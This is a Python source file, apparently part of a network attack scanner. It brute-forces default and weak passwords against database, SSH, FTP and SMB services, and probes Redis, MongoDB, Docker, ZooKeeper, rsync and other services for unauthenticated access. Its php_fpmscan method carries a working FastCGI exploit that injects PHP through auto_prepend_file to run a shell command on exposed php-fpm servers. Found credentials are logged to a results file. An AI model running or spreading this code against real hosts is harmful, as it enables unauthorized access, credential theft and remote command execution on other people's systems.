#coding:utf-8
import requests
import pymysql
import socket
import cx_Oracle
import pymongo
import psycopg2
import pymssql
import sys
import logging
from ftplib import FTP
from smb.SMBConnection import SMBConnection
import http.client
import paramiko
import random
from io import BytesIO
from lib.config import *

socket.setdefaulttimeout(5)
PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])

def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)

def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')

def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s

class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
               + bchr(fcgi_type) \
               + bchr((requestid >> 8) & 0xFF) \
               + bchr(requestid & 0xFF) \
               + bchr((length >> 8) & 0xFF) \
               + bchr(length & 0xFF) \
               + bchr(0) \
               + bchr(0) \
               + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''
            
            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        if not self.__connect():
            return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        self.sock.send(request)
        self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)

class RSync:

    def __init__(self, ip, port, timeout):
        self.ip = ip
        self.port = port
        self.timeout = timeout

        self.sock = None

    def url(self):
        return 'rsync://%s:%d' % (self.ip, self.port)

    def version(self, disconnect=True, timeout=None):
        banner = self.connect(timeout=timeout)

        banner = banner.decode()
        if not banner.startswith('@RSYNCD:'):
            raise Exception('Not a rsync server')

        banner = banner.strip()
        version = banner.split()[-1]

        try:
            welcome = self.sock.recv(1024*5)
            welcome = welcome.decode()
        except socket.timeout:
            welcome = None

        if disconnect:
            self.disconnect()

        return version, welcome

    def list_shares(self):
        version, _ = self.version(disconnect=False)

        self.sock.send(('@RSYNCD: %s\n' % version).encode())
        self.sock.send(b'#list\n')

        shares_txt = self.recv_until(b'@RSYNCD: EXIT')

        self.disconnect()

        shares = []
        for line in shares_txt.decode().split('\n'):
            if line.startswith('@RSYNCD: EXIT'):
                break
            share_name = line.split('\t', 1)[0].strip()
            share_desc = line.split('\t', 1)[-1].strip()

            anon_allowed, message = self.check_anon_access(share_name)
            
            shares.append({'name': share_name, 'description': share_desc, 'anon': anon_allowed, 'auth_message': message})

        return shares

    def recv_until(self, end_b):
        received = b''
        while True:
            received += self.sock.recv(1024)
            if end_b in received:
                break

        return received

    def check_anon_access(self, share):
        version, _ = self.version(disconnect=False)

        self.sock.send(('@RSYNCD: %s\n' % version).encode())
        self.sock.send(('%s\n' % share).encode())

        try:
            response = self.sock.recv(1024)
            response = response.decode()

            self.disconnect()

            if response.startswith('@ERROR:'):
                return False, response.strip().split(' ', 1)[-1]
            elif response.startswith('@RSYNCD: OK'):
                return True, 'OK'
            elif response.startswith('@RSYNCD: AUTHREQD'):
                return False, 'Authentication required'
            else:
                return False, 'Unknown message \'%s\'' % response.strip()
        except socket.timeout:
            return False, 'timeout...' % response.strip()

    def connect(self, timeout=None):
        if self.sock:
            self.disconnect()

        if not timeout:
            timeout = self.timeout

        self.sock = socket.socket()
        self.sock.settimeout(timeout)
        self.sock.connect((self.ip, self.port))

        banner = self.sock.recv(1024)

        return banner

    def disconnect(self):
        if self.sock:
            self.sock.close()
        self.sock = None

class check(object):
    def save(self, file_path,data):
        with open(file_path, "a+" ,encoding='utf-8') as wf:
            wf.write(data + "\n")

    def mysql(self, ip):
        for pwd in passwd:
            try:
                pwd = pwd.replace('{user}', 'root')
                conn = pymysql.connect(ip, 'root', pwd, 'mysql', 3306, connect_timeout=5)
                if conn:
                    print ('{}[+] {}:3306  Mysql存在弱口令: root  {}{}'.format(G, ip, pwd, W))
                    self.save('result.txt',"{}:3306\tMysql存在弱口令: root:{}".format(ip,pwd))
                    return
                conn.close()
            except Exception as e:
                if "is not allowed to connect to this" in str(e):
                    continue

    def mssql(self, ip):
        for pwd in passwd:
            try:
                conn=pymssql.connect(server=ip, port=1433, user='sa', password=pwd)
                print  ('{}[+] {}:1433  SQLserver存在弱口令: sa  {}{}'.format(G, ip, pwd, W))
                self.save('result.txt', "{}:1433\tSQLserver存在弱口令: sa:{}".format(ip,pwd))
                conn.close()
                break
            except:
                pass           

    def oracle(self, ip):
        burte_address = [':1521/orcl',':1521/XE']
        for bp in burte_address:
            for i in range(1, len(oracle_user)):
                try:
                    user = oracle_user[i]
                    pwd  = oracle_pass_default[i]
                    conn = cx_Oracle.connect(user, pwd, ip + bp)
                    print  ('{}[+] {}:1521  Oracle存在弱口令: {} {}{}'.format(G, ip, user, pwd, W))
                    self.save('result.txt', "{}:1521\tOracle存在弱口令: {} {}".format(ip,user,pwd))
                    conn.close()
                except Exception as e:
                    pass
            for pwd in passwd:
                try:
                    pwd = pwd.replace('{user}', 'sys')
                    conn = cx_Oracle.connect('system', pwd, ip + bp)
                    print  ('{}[+] {}:1521  Oracle存在弱口令: sys {}{}'.format(G, ip, pwd, W))
                    self.save('result.txt',"{}:1521\tOracle存在弱口令: sys {}".format(ip,pwd) )
                    conn.close()
                    return
                except Exception as e:
                    pass

    def postgresql(self, ip):
        for pwd in passwd:
            try:
                pwd = pwd.replace('{user}', 'postgres')
                conn = psycopg2.connect(host=ip, port=5432, user='postgres', password=pwd)
                print('{} [+] {}:5432  Postgresql存在弱口令: postgres  {}{}'.format(G, ip, pwd, W))
                self.save('result.txt', "{}:5432\tPostgresql存在弱口令: postgre".format(ip,pwd))
                conn.close()
                return
            except Exception as e:
                pass

    def redis(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ip, 6379))
            s.send(b'INFO\r\n')
            if b'redis_version' in s.recv(1024):
                print('{}[+] {}:6379  Redis存在未授权访问{}'.format(G, ip, W))
                self.save('result.txt', "{}:6379\tRedis存在未授权访问".format(ip))
            else:
                for pwd in passwd:
                    try:
                        pwd = pwd.replace('{user}', 'admin')
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(5.0)
                        s.connect((ip, 6379))
                        s.send(bytes('AUTH {}\r\n'.format(pwd) ,encoding='utf-8'))
                        if b'+OK' in s.recv(1024):
                            print ('{}[+] {}:6379  Redis存在弱口令: {}{}'.format(G, ip, pwd, W))
                            self.save('result.txt', "{}:6379\tRedis存在弱口令: {}".format(ip,pwd))
                            break
                    except Exception as e:
                        print(e)
                    finally:
                        s.close()
        except Exception as e:
            pass
        finally:
            s.close()

    def mongodb(self, ip):
        try:
            conn = pymongo.MongoClient(ip, 27017)
            dbname = conn.database_names()
            print  ('{}[+] {}:27017  MongoDB存在未授权访问{}'.format(G, ip, W))
            self.save('result.txt', "{}:27017\tMongoDB存在未授权访问".format(ip))
        except Exception as e:
            pass
        finally:
            conn.close()

    def memcached(self, ip):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5.0)
            s.connect((ip, 11211))
            s.send(b'stats\r\n')
            if b'version' in s.recv(1024):
                print  ('{}[+] {}:11211  Memcached存在未授权访问{}'.format(G, ip, W))
                self.save('result.txt', "{}:11211\tMemcached存在未授权访问".format(ip))
        except Exception as e:
            print(e)
        finally:
            s.close()

    def elasticsearch(self, ip):
        try:
            url = 'http://' + ip +':9200/_cat'
            r = requests.get(url, timeout=5)
            if b'/_cat/master' in r.content:
                print  ('{}[+] {}:9200  Elasticsearch存在未授权访问{}'.format(G, ip, W))
                self.save('result.txt', "{}:9200\tElasticsearch存在未授权访问".format(ip))
        except Exception as e:
            pass

    def sshlogin(self,ip,user,pwd,time):
        try:
            logging.raiseExceptions = False
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=user, password=pwd, timeout=time)
            stdin, stdout, stderr = ssh.exec_command('id')
            printout = stdout.read()
            if "uid" in str(printout) and user in str(printout):
                return True
            else:
                return False
        except Exception as e:
            return False
        finally:
            ssh.close()


    def sshbrute(self,ip):
        for user in ssh_user:
            for pwd in passwd:
                pwd = pwd.replace('{user}', user)
                login = self.sshlogin(ip,user,pwd,5)
                if login:
                    print ('{}[+] {}:22  ssh存在弱口令: {} {}{}'.format(G, ip, user, pwd, W))
                    self.save('result.txt', "{}:22 \tssh存在弱口令: {}:{}".format(ip, user, pwd))
                    break
                
    def ftp_anonymous(self,ip):
        try:
            ftp = FTP(ip)
            ftp.login()
            ftp.retrlines('LIST')
            ftp.quit()
            return True
        except:
            return False

    def ftplogin(self,ip,user,pwd):
        try:
            ftp = FTP(ip)
            ftp.login(user,pwd)
            ftp.retrlines('LIST')
            ftp.quit()
            return True
        except:
            return False

    def ftpbrute(self,ip):
        if self.ftp_anonymous(ip):
            print ('{}[+] {}:21  ftp 未授权访问 {}'.format(G, ip, W))
            self.save('result.txt', "{}:21 \t ftp 未授权访问".format(ip))
        else:
            for username in ftp_user:
                for pwd in passwd:
                    pwd = pwd.replace('{user}', username)
                    if self.ftplogin(ip,username,pwd):
                        print  ('{}[+] {}:21  ftp存在弱口令: {} {}{}'.format(G, ip, username, pwd, W))
                        self.save('result.txt', "{}:21  \t  ftp存在弱口令:{}:{}".format(ip,username,pwd))
                        return
    # https://github.com/hegusung/netscan/blob/026d1d1e0dbe6245efb9908121407ed9b66d29df/lib/rsyncscan/rsyncscan.py
    def rsyncscan(self,ip):
        port = 873
        timeout = 5
        rsync = RSync(ip, port, timeout)

        try:
            version, welcome = rsync.version()
            shares = rsync.list_shares()
            output = 'Rsync shares:\n'
            for share in shares:
                if share['anon'] == True:
                    print  ('{}[+] {}:873  rsync存在未授权访问漏洞 {}'.format(G, ip, W))
                    self.save('result.txt', "{}:873\trsync存在未授权访问漏洞".format(ip))
                    return
                else:
                    pass

        except Exception as e:
            pass

    def smbbrute(self,ip):
        for pwd in passwd:
            try:
                conn = SMBConnection('administrator', pwd, "client", ip,domain="", use_ntlm_v2=True, is_direct_tcp=True)
                conn.connect(ip, 445, timeout=5)
                lists = conn.listShares()
                if lists:
                    print  ('{}[+] {}:445  smb存在弱口令 administrator:{} {}'.format(G, ip, pwd,W))
                    self.save('result.txt', "{}:445 \tsmb存在弱口令: administrator:{}".format(ip,pwd))
                    return
            except Exception as e:
                pass
            finally:
                conn.close()

    def zookeeper(self,ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5.0)
        s.connect((ip, 2181))
        s.send(b"envi")
        result = s.recv(1024)
        if b"zookeeper.version" in result:
            print ('{}[+] {}:2181  ZooKeeper存在未授权访问{}'.format(G, ip, W))
            self.save('result.txt', "{}:2181\tZooKeeper存在未授权访问".format(ip))

    def docker(self,ip):
        url = 'http://' + ip + ':2375/version'
        r = requests.get(url)
        if r.status_code == 200 and b'ApiVersion' in r.content:
            print ('{}[+] {}:2375  docker存在未授权访问{}'.format(G, ip, W))
            self.save('result.txt', "{}:2375\tdoker存在未授权访问".format(ip))
    
    # https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75
    def php_fpmscan(self,ip):
        code = '<?php echo `id`; ?>'
        port = 9000
        # find / -name "*.php"
        file = '/usr/local/lib/php/PEAR.php' 
        client = FastCGIClient(ip, port, 3, 0)
        params = dict()
        documentRoot = "/"
        uri = file
        content = code
        params = {
            'GATEWAY_INTERFACE': 'FastCGI/1.0',
            'REQUEST_METHOD': 'POST',
            'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
            'SCRIPT_NAME': uri,
            'QUERY_STRING': '',
            'REQUEST_URI': uri,
            'DOCUMENT_ROOT': documentRoot,
            'SERVER_SOFTWARE': 'php/fcgiclient',
            'REMOTE_ADDR': '127.0.0.1',
            'REMOTE_PORT': '9985',
            'SERVER_ADDR': '127.0.0.1',
            'SERVER_PORT': '80',
            'SERVER_NAME': "localhost",
            'SERVER_PROTOCOL': 'HTTP/1.1',
            'CONTENT_TYPE': 'application/text',
            'CONTENT_LENGTH': "%d" % len(content),
            'PHP_VALUE': 'auto_prepend_file = php://input',
            'PHP_ADMIN_VALUE': 'allow_url_include = On'
        }
        try:
            response = client.request(params, content)
            if 'uid' in force_text(response):
                print ('{}[+] {}:9000  php-fpm存在未授权访问漏洞 {}'.format(G, ip, W))
                self.save('result.txt', "{}:9000\tphp-fpm存在未授权访问漏洞".format(ip))
        except:
            pass